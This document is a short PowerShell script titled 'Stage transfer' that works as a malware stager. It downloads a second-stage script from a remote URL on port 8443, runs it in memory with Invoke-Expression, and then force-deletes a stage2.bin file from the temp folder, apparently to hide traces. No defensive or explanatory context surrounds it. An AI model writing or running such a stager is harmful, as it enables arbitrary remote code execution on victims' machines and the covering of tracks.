
<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'https://example.net:8443/stage2.ps1',
    [int]$StageTimeout = 98
)
IEX (Invoke-WebRequest -Uri $RemoteUrl -UseBasicParsing).Content
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
